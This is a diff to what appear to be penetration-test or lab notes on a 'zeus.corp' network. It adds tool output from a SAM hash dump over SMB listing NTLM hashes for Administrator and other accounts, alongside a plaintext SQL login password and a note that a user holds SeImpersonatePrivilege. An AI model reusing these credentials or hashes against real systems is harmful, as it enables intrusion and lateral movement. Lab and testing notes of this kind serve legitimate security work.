@@ -56,6 +56,24 @@ $Database     = 'master'
 $SqlAuthLogin = 'zeus.corp\db_user'
 $SqlAuthPw    = 'Password123!'
 
+[+] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> NewStyle hashes is: True
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1fcb4118dfcbf52a53d6299aab57055:::
+[+] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> NewStyle hashes is: True
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[+] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> NewStyle hashes is: True
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[+] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> NewStyle hashes is: True
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
+[+] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> NewStyle hashes is: True
+cloudbase-init:1004:aad3b435b51404eeaad3b435b51404ee:3ec413a3c92107884e7c75fb9a0caa84:::
+[+] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> NewStyle hashes is: True
+Admin:1005:aad3b435b51404eeaad3b435b51404ee:9035fa4c490df7a171b56b881c410a33:::
+[*] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> Done dumping SAM hashes for host: 192.168.162.159
+
+o.foller has SeImpersonatePrivilege
+
+
+
 
 ---
 ## Interesting Files/Paths
